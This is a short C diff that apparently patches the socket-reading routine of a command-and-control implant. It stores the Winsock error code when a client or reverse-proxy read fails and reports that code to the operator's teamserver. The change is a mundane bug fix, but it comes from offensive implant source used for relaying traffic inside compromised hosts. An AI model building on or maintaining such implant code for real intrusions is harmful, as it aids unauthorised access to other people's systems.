@@ -289,6 +289,7 @@ VOID SocketRead()
     BUFFER       PartialData = { 0 };
     BUFFER       FullData    = { 0 };
     BOOL         Failed      = FALSE;
+    DWORD        ErrorCode   = 0;
 
     Socket = Instance.Sockets;
 
@@ -297,6 +298,9 @@ VOID SocketRead()
     {
         if ( ! Socket )
             break;
+
+        Failed    = FALSE;
+        ErrorCode = 0;
 
         /* reads data from connected clients/socks proxies */
         if ( Socket->Type == SOCKET_TYPE_CLIENT || Socket->Type == SOCKET_TYPE_REVERSE_PROXY )
@@ -325,17 +329,17 @@ VOID SocketRead()
                             SOCKET_TYPE_CLIENT_REMOVED :
                             SOCKET_TYPE_SOCKS_REMOVED  ;
 
-                    Failed = TRUE;
-                    break;
+                    Failed    = TRUE;
+                    ErrorCode = Instance.Win32.WSAGetLastError();
                 }
 
                 if ( PartialData.Length > 0 )
                 {
                     PartialData.Buffer = NtHeapAlloc( PartialData.Length );
-                    if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) )
-                    {
-                        Failed = TRUE;
-                        break;
+
+                    if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) ) {
+                        Failed    = TRUE;
+                        ErrorCode = Instance.Win32.WSAGetLastError();
                     }
 
                     if ( PartialData.Length > 0 )
@@ -395,11 +399,12 @@ VOID SocketRead()
                 /* Create socket request package */
                 Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
+                /* notify the teamserver of the error */
                 PackageAddInt32( Package, SOCKET_COMMAND_READ );
                 PackageAddInt32( Package, Socket->ID );
                 PackageAddInt32( Package, Socket->Type );
                 PackageAddInt32( Package, FALSE );
-                PackageAddInt32( Package, Instance.Win32.WSAGetLastError() );
+                PackageAddInt32( Package, ErrorCode );
 
                 /* now let's send it */
                 PackageTransmit( Package, NULL, NULL );
